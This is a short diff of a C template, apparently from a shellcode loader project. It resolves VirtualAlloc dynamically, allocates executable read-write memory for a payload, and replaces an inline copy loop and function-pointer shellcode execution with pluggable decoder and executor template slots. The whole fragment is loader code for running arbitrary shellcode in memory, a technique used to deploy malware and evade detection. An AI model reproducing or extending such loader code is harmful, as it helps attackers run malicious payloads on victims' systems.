@@ -85,14 +85,15 @@ int main()
 			_In_ DWORD  flProtect)) _GetProcAddress((HMODULE)base, VirtualAlloc_str);
 	if (_VirtualAlloc == NULL) return 4;
 	char *dest = _VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x40);
-	// 11223344 is a magic number which will be replaced in the asm source
-	// with the payload length.
-	for(int n=0; n<{{PAYLOAD_LEN}}; n++) {
-		dest[n] = supermega_payload[n];
-	}
 
-	// Exec shellcode
-	 (*(void(*)())(dest))();
+	// Copy
+	// from: supermega_payload[]
+	// to:   dest[]
+    // len:  0x11223344
+{{ plugin_decoder }}
+
+    // Execute *dest
+{{ plugin_executor }}
 
 	return 0;
 }
